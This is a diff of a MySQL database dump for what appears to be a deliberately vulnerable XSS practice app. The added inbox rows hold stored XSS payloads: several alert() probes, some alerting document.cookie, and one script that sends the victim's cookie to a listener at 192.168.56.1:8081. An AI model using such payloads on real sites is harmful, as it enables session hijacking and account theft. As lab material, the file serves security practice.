@@ -54,7 +54,7 @@ CREATE TABLE `materi` (
   `pemateri` varchar(50) DEFAULT NULL,
   `namafile` varchar(100) NOT NULL,
   PRIMARY KEY (`id`)
-) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -99,6 +99,31 @@ INSERT INTO `peserta_pns` VALUES (1,12340,'Muh ikhwan','sleman','088800125473','
 UNLOCK TABLES;
 
 --
+-- Table structure for table `xss_note`
+--
+
+DROP TABLE IF EXISTS `xss_note`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `xss_note` (
+  `note_id` int(5) NOT NULL AUTO_INCREMENT,
+  `user_id` int(5) NOT NULL,
+  `note` varchar(200) NOT NULL DEFAULT '"add self note"',
+  PRIMARY KEY (`note_id`)
+) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `xss_note`
+--
+
+LOCK TABLES `xss_note` WRITE;
+/*!40000 ALTER TABLE `xss_note` DISABLE KEYS */;
+INSERT INTO `xss_note` VALUES (2,1,'tess'),(3,2,'tess');
+/*!40000 ALTER TABLE `xss_note` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
 -- Table structure for table `xss_profil_user`
 --
 
@@ -112,7 +137,7 @@ CREATE TABLE `xss_profil_user` (
   `pass` varchar(80) NOT NULL,
   `tgl_lahir` date NOT NULL,
   PRIMARY KEY (`id_profil`)
-) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -141,7 +166,7 @@ CREATE TABLE `xss_user_inbox` (
   `status_baca` int(2) NOT NULL,
   PRIMARY KEY (`id_pesan`),
   KEY `id_profil_user` (`id_profil_user`)
-) ENGINE=InnoDB DEFAULT CHARSET=latin1;
+) ENGINE=InnoDB AUTO_INCREMENT=23 DEFAULT CHARSET=latin1;
 /*!40101 SET character_set_client = @saved_cs_client */;
 
 --
@@ -150,6 +175,7 @@ CREATE TABLE `xss_user_inbox` (
 
 LOCK TABLES `xss_user_inbox` WRITE;
 /*!40000 ALTER TABLE `xss_user_inbox` DISABLE KEYS */;
+INSERT INTO `xss_user_inbox` VALUES (1,2,1,'tes','<script>alert(\"halo kamu kena hack\");</script>',1),(2,2,1,'tes','<script>\r\ndocument.location=\"http://192.168.56.1:8081/\"+document.cookie;\r\n</script>',1),(3,3,2,'jangan macam-macam ','jangan macam-macam kamu sama pacar saya!',0),(4,2,1,'tes','<h1>tes</h1>',1),(5,2,1,'ready gan','<h1>ready</h1> ',1),(6,8,8,'mousey','<h1>ready</h1>',1),(7,9,4,'ready gan','<h1>ready</h1>',1),(8,7,6,'hallo','<h1>pesan ready</h1>',1),(9,5,8,'123','<h1>ready</h1>',1),(10,5,8,'tes','<img src=x oneerror=alert(10)>',1),(11,7,6,'hallo sec','<img src=x oneerror=alert(10)>',1),(12,2,1,'tes','<img src=x onerror=alert(10)>',1),(13,4,9,'tes','<img src=x onerror=alert(10)>',1),(14,5,8,'test','<img src=\"x\" onerror=\"alert(10)\">',1),(15,7,6,'hallo 2','<img src=x onerror=alert(10)>',1),(16,2,1,'tes','<img src=x onerror=alert(document.cookie)>',1),(17,5,8,'testing','<img src=x onerror=alert(document.cookie)>',1),(18,4,9,'tes2','<img src=x onerror=alert(document.cookie)>',1),(19,7,6,'curi cookie','<img src=x onerror=alert(document.cookie)>',1),(20,5,8,'testing22','<img src=x onerror=alert(document.cookie)>',1),(21,8,5,'testing','<img src=x onerror=alert(document.cookie)>',1);
 /*!40000 ALTER TABLE `xss_user_inbox` ENABLE KEYS */;
 UNLOCK TABLES;
 /*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
@@ -162,4 +188,4 @@ UNLOCK TABLES;
 /*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
 /*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
 
--- Dump completed on 2017-04-07 17:25:34
+-- Dump completed on 2018-05-09 21:38:34
